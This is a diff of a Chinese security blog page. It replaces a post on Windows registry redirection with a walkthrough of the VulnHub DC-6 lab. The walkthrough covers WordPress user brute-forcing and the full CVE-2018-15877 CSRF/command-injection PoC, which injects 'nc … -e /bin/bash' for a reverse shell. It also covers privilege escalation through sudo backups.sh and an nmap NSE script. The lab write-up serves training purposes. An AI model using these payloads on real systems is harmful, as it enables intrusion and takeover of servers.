@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-6 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-6，包含了wordpress后台插件命令注入拿shell、nmap高版本提权获取root等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-6 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-6 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-15
                 </div>
                 
 
@@ -395,45 +395,131 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-6，包含了wordpress后台插件命令注入拿shell、nmap高版本提权获取root等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-6-【DC系列】"><a href="#VulnHub靶机渗透之DC-6-【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-6 【DC系列】"></a>VulnHub靶机渗透之DC-6 【DC系列】</h1><p>dc6靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></p>
+<p>运行系统：kali+ dc-6</p>
+<p>平台：vmware workstation</p>
+<p>网络：均使用nat</p>
+<p>任务：拿到root权限，找到flag</p>
+<h4 id="发现主机-192-168-124-136"><a href="#发现主机-192-168-124-136" class="headerlink" title="发现主机-&gt;192.168.124.136"></a>发现主机-&gt;192.168.124.136</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260060211.png" alt="1647260060211"></p>
+<h4 id="对靶机进行nmap完整扫描-22、80-端口开放-linux的os"><a href="#对靶机进行nmap完整扫描-22、80-端口开放-linux的os" class="headerlink" title="对靶机进行nmap完整扫描-&gt;22、80 端口开放 linux的os"></a>对靶机进行nmap完整扫描-&gt;22、80 端口开放 linux的os</h4><p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260150395.png" alt="1647260150395"></p>
+<p>访问80端口，但是访问不了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260349934.png" alt="1647260349934"></p>
+<p>因为做了域名绑定，所以需要我们在本地做个域名映射，这个和之前DC-2是一样的问题，要修改hosts文件。</p>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p>kali</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>在末尾加入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.124.136   wordy </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260392674.png" alt="1647260392674"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260566055.png" alt="1647260566055"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260507674.png" alt="1647260507674"></p>
+<h4 id="指纹识别-wordpress"><a href="#指纹识别-wordpress" class="headerlink" title="指纹识别-wordpress"></a>指纹识别-wordpress</h4><p>web站点访问成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260640209.png" alt="1647260640209"></p>
+<p>cms是wordpress，默认后台 <a target="_blank" rel="noopener" href="http://wordy/wp-admin/">http://wordy/wp-admin/</a> </p>
+<h4 id="wpscan-枚举用户，暴力破解密码"><a href="#wpscan-枚举用户，暴力破解密码" class="headerlink" title="wpscan 枚举用户，暴力破解密码"></a>wpscan 枚举用户，暴力破解密码</h4><p>使用wordpress专用的工具wpscan进行扫描</p>
+<p>先枚举可能存在的用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan  --url  http://wordy/ -e u </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260841446.png" alt="1647260841446"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647260864227.png" alt="1647260864227"></p>
+<p>用户名   </p>
+<p>admin    mark   graham  sarah  jens</p>
+<p>在官网下载的时候有暗示：可以减少我们爆破密码的时间</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261065739.png" alt="1647261065739"></p>
+<p>但是我kali可能删过东西，这个没有，我在网上搜了一下，通过这个线索，可以获得一个密码字典。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261238489.png" alt="1647261238489"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261347495.png" alt="1647261347495"></p>
+<p>创建两个文件，一个usernames.txt  ，一个passwords.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261454806.png" alt="1647261454806"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261496328.png" alt="1647261496328"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan –url http://wordy –U username.txt –P passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261478802.png" alt="1647261478802"></p>
+<p>mark &#x2F; helpdesk01</p>
+<p>登录成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647261694497.png" alt="1647261694497"></p>
+<h4 id="activity-monitor-插件漏洞利用-利用csrf漏洞反弹shell"><a href="#activity-monitor-插件漏洞利用-利用csrf漏洞反弹shell" class="headerlink" title="activity monitor 插件漏洞利用  -利用csrf漏洞反弹shell"></a>activity monitor 插件漏洞利用  -利用csrf漏洞反弹shell</h4><p>查看了一番，看到插件Activity。一般像word press这样成熟的cms漏洞多数在插件和主题中，所有我们要特别关注插件和主题。</p>
+<p>看到 <code>activity monitor</code>插件，简单搜索了一下，发现这个插件是可以被利用。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647262380765.png" alt="1647261952043"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647262532827.png" alt="1647262532827"></p>
+<p>发现这个插件有命令执行漏洞（CVE -2018-</p>
+<p>15877）</p>
+<p>复制到本地， 是CSRF漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">About:</span><br><span class="line">===========</span><br><span class="line">Component: Plainview Activity Monitor (Wordpress plugin)</span><br><span class="line">Vulnerable version: 20161228 and possibly prior</span><br><span class="line">Fixed version: 20180826</span><br><span class="line">CVE-ID: CVE-2018-15877</span><br><span class="line">CWE-ID: CWE-78</span><br><span class="line">Author:</span><br><span class="line">- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)</span><br><span class="line"></span><br><span class="line">Timeline:</span><br><span class="line">===========</span><br><span class="line">- 2018/08/25: Vulnerability found</span><br><span class="line">- 2018/08/25: CVE-ID request</span><br><span class="line">- 2018/08/26: Reported to developer</span><br><span class="line">- 2018/08/26: Fixed version</span><br><span class="line">- 2018/08/26: Advisory published on GitHub</span><br><span class="line">- 2018/08/26: Advisory sent to bugtraq mailing list</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">===========</span><br><span class="line">Plainview Activity Monitor Wordpress plugin is vulnerable to OS</span><br><span class="line">command injection which allows an attacker to remotely execute</span><br><span class="line">commands on underlying system. Application passes unsafe user supplied</span><br><span class="line">data to ip parameter into activities_overview.php.</span><br><span class="line">Privileges are required in order to exploit this vulnerability, but</span><br><span class="line">this plugin version is also vulnerable to CSRF attack and Reflected</span><br><span class="line">XSS. Combined, these three vulnerabilities can lead to Remote Command</span><br><span class="line">Execution just with an admin click on a malicious link.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">===========</span><br><span class="line">https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/</span><br><span class="line"></span><br><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
+
+<p>poc需要修改两处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647263337406.png" alt="1647263337406"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647263351908.png" alt="1647263351908"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc  192.168.124.134 1234 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647262817541.png" alt="1647262817541"></p>
+<p>kali里面访问该html文件，尝试获取反向shell，但是失败了，发现不能够成功反弹出shell。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647262999467.png" alt="1647262999467"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647263276236.png" alt="1647263276236"></p>
+<p>原本以为这个poc没利用成功，纠结了蛮久的，但是后来换了个端口成功了。</p>
+<p>换成6666端口了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc  192.168.124.134 6666 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313482991.png" alt="1647313482991"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313426470.png" alt="1647313426470"></p>
+<p>使用python进入交互的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313688897.png" alt="1647313688897"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313651713.png" alt="1647313651713"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -10 /etc/passwd  </span><br><span class="line"># 发现有几个用户在/home目录下 </span><br></pre></td></tr></table></figure>
+
+<p>切换到&#x2F;home目录下，发现有4个用户</p>
+<p>graham	jens  mark  sarah</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313942015.png" alt="1647313942015"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647313860024.png" alt="1647313860024"></p>
+<p>graham &#x2F; GSo7isUM1D4</p>
+<p>添加了一个用户graham 口令为 GSo7isUM1D4 ，因为系统开放了22端口，此时可以通过ssh登录该用户。</p>
+<h4 id="graham用户ssh登录"><a href="#graham用户ssh登录" class="headerlink" title="graham用户ssh登录"></a>graham用户ssh登录</h4><p>ssh成功登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh graham@192.168.124.136</span><br><span class="line"># ssh登录graham</span><br><span class="line">sudo -l   </span><br><span class="line"># 查看权限【可以执行的操作】</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647314079705.png" alt="1647314079705"></p>
+<p><code>sudo -l </code>查看可执行的操作。发现能够以jens用户，不使用口令执行情况下执行backups.sh。</p>
+<p>看了一下backups.sh为一个文件解压的命令行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647320810655.png" alt="1647320810655"></p>
+<p>在解压指令后添加<code>/bin/bash</code>  ，然后以jens用户去执行操作【当执行时可以获得jens的shell】。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash&#x27;  &gt;&gt; backups.sh</span><br><span class="line"># 在 backups.sh 末尾增加/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647314760130.png" alt="1647314760130"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>执行成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647323552143.png" alt="1647323552143"></p>
+<h4 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h4><p>发现可以无需root密码执行nmap</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647322816874.png" alt="1647322816874"><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647322844908.png" alt="1647322844908"></p>
+<p>较旧版本的 Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。新版本去除了交互模式，利用代码执行来获取到root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647322954940.png" alt="1647322954940"></p>
+<p>靶机里面nmap的版本是7.40，所以不能interactive 交互模式提权，所以用自定义script脚本提权,而nmap可以执行它自己的脚本文件，后缀为.nse</p>
+<p>nmap  2.02 to 5.21版本提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入nmap的交互模式</span><br><span class="line">nmap --interactive</span><br><span class="line"># 执行sh，提权成功</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>nmap 5.21之后版本提权，下面两种方法其实都是一样的，一定要注意运行script的时候加上sudo，不然会提权失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">way1:</span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br><span class="line"></span><br><span class="line">way2:</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; root.nse</span><br><span class="line">sudo nmap --script=/home/jens/root.nse</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647324105515.png" alt="1647324105515"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647323970671.png" alt="1647323970671"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>wpsacn爆破网站用户密码<br>wordpress后台Activity monitor插件命令注入获取shell<br>nmap高版本提权获取root</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a> 【gtfobins的nmap提权】</p>
+<p>VulnHub-DC：6                【<strong>大余安全</strong>】</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/SecIN/p/15504606.html">https://www.cnblogs.com/SecIN/p/15504606.html</a>  【dc1-7通关手册】</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7258">https://xz.aliyun.com/t/7258</a>  【谈一谈Linux与suid提权】</p>
+<p>靶场攻略 | DC6 (vulnhub)            【<strong>betasec</strong>】</p>
+<p>Vulnhub 靶机实战系列：DC -6          【<strong>雷神众测</strong>】            </p>
 
                 
             </div>
@@ -460,7 +546,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/15/dc-6/">http://highgerms.github.io/2022/03/15/dc-6/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +584,8 @@
                     
                         <div class="article-tag">
                             
